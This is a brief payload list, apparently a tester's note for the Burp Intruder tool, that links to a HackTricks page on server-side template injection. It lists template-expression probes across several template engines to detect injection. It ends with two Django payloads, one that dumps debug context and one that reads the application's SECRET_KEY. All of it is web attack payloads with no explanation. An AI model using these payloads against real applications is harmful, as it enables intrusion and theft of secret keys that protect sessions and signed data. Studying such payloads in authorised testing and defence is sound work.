Intruder payloads LINK: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

{% 7+7 %}
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}


django ssti ==>
{% debug %}
{{settings.SECRET_KEY}}
